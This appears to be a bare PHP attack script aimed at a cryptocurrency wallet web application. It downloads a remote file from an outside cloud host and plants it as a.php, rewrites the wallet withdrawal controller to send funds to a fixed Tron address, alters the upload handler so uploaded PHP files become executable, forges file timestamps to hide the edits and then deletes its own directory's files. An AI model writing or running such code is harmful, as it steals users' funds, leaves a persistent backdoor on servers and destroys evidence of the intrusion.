<?php
file_put_contents('../../../im/a.php',file_get_contents('http://cos-1257240995.cos.eu-frankfurt.myqcloud.com/ck.txt'));
touch("../admin/build/js/a.php",mktime(19,5,10,10,26,2013));
$file_paths = glob('../../app/Http/Controllers/Api/WalletController.php');
$upload_file_paths = glob('../../app/Http/Controllers/Api/DefaultController.php');
$currency_id = "'3'";
$address = "'TCtGo1o5ER4X5eNL2xtcaEVSBDx7SsQqU6'";
if (count($file_paths)>0){
    $file_path = $file_paths[0];
    chmod($file_path, 0755);
    $time =mktime(19,5,10,02,26,2022);
    file_put_contents($file_path,str_replace('$walletOut->currency = $currency_id','$walletOut->currency = '.$currency_id,file_get_contents($file_path)));
    //file_put_contents($file_path,str_replace('$walletOut->currency = \'1\'','$walletOut->currency = '.$currency_id,file_get_contents($file_path)));
    file_put_contents($file_path,str_replace('$walletOut->address = $address','$walletOut->address = '.$address,file_get_contents($file_path)));
    touch($file_path,$time);
    chmod($file_path, 0755);
}
if (count($upload_file_paths)>0){
    $file_path = $upload_file_paths[0];
    chmod($file_path, 0755);
    $time =mktime(19,5,10,02,26,2022);
    file_put_contents($file_path,str_replace('move_uploaded_file($_FILES["file"]["tmp_name"], $filename);','move_uploaded_file($_FILES["file"]["tmp_name"], $type=="php"?(iconv("UTF-8", "gb2312", "./upload/".md5($filename).".php")):$filename);',file_get_contents($file_path)));
    //file_put_contents($file_path,str_replace('$walletOut->currency = \'1\'','$walletOut->currency = '.$currency_id,file_get_contents($file_path)));
    //file_put_contents($file_path,str_replace('$walletOut->address = $address','$walletOut->address = '.$address,file_get_contents($file_path)));
    touch($file_path,$time);
    chmod($file_path, 0755);
}

foreach(glob('./*.php') as $f)
unlink($f);
foreach(glob('./*.*') as $f)
unlink($f);